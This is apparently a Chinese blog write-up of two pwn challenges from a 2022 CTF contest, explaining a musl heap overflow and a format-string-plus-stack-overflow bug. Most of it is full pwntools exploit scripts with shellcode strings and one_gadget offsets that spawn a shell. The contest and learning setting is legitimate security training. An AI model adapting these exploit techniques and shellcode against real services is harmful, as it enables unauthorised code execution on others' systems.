---
title: 2022 DASCTFAprXFATE防疫挑战赛 pwn 复现
date: 2022-05-1 23:52:59 +0800
categories:
  - ctf比赛
tags:
  - pwn
  - ctf
permalink: /posts/id=18/
pin: false
published:
---

这次本来musl能做出来的，脑子抽抽了都泄露堆地址了，泄露libc还卡半天。

## storage(musl1.2.2/堆溢出)

![image-20220501125308425](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220501125308425.png)

管理结构基本这样，申请堆的时候发现可以申请负数，同时因为申请的是size+1所以可以申请到最小0x10堆块，利用这一点结合edit和show，以及offbynull，控制ptr管理堆块实现任意地址读写，打IO结构体就行

```python
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'

p = process('./storage')
elf = ELF("./storage")
# libc = elf.libc
# p = remote("123.60.76.240","60001")
def dbg():
    gdb.attach(p)

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def add(size,con):
	sla(">> ",1)
	sla("String size?",size)
	p.sendafter("String?",con)
def show(idx):
	sla(">> ",2)
	sla('String idx?',idx)
def dele(idx):
	sla(">> ",3)
	sla('String idx?',idx)
def edit(idx,con):
	sla(">> ",4)
	sla('String idx?',idx)
	p.sendafter("New string?",con)

add(0x400,'a'*8)
add(-1,'\x00'*0x3F0)
show(0)
p.recvuntil("String: ")
heap_base = u64(p.recv(6).ljust(8,'\x00'))
lg('heap_base',heap_base)

edit(1,'\x00'*0x3F0+p64(heap_base+0x38)[:6])
show(0)
p.recvuntil("String: ")
libc_base = u64(p.recv(6).ljust(8,'\x00'))-0xb7860
lg('libc_base',libc_base)

stderr_use = libc_base + 0xb4080
str_bin_sh = libc_base + 0xb21d7
system_addr = libc_base + 0x50a90

edit(1,'\x00'*0x3F0+p64(stderr_use)[:6])
edit(0,"/bin/sh\x00"+"A"*0x20+p64(1)+'a'*8+p64(0)+'a'*8+p64(system_addr))

dele(99)

p.interactive()
```

## luck(格式化字符串+栈溢出)

这题很简单就不赘述了，格式化字符串泄露地址同时栈溢出控制ret

```python
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'

p = process('./luck')
elf = ELF("./luck")
libc = elf.libc

p = remote('39.99.242.16',10000)
def dbg():
    gdb.attach(p)

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
csu1 = 0x400A1A
csu2 = 0x400A00
fmtretn = 0x400875
finarry = 0x600E18
game = 0x400923
puts_got = elf.got['puts']
fmt = 0x400836
ret = 0x400922
overflow = 0x400876
pay = 'a'*0x58+p64(ret)+p64(fmt)
sla("luck!",pay)

pay = "%7$saaaa"+p64(puts_got)
pay = pay.ljust(0x78,'a')
pay += p64(fmt)
sla("fmt",pay)
puts = uu64()
lg("puts",puts)
libc_base = puts-libc.sym['puts']

lg('libc_base',libc_base)

one = 0x45226+libc_base
lg('one',one)
pay = 'a'*0x78+p64(one)
sla("fmt",pay)
'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
p.interactive()
```

> 比赛的时候就看了这2题，其它的复现后续更新

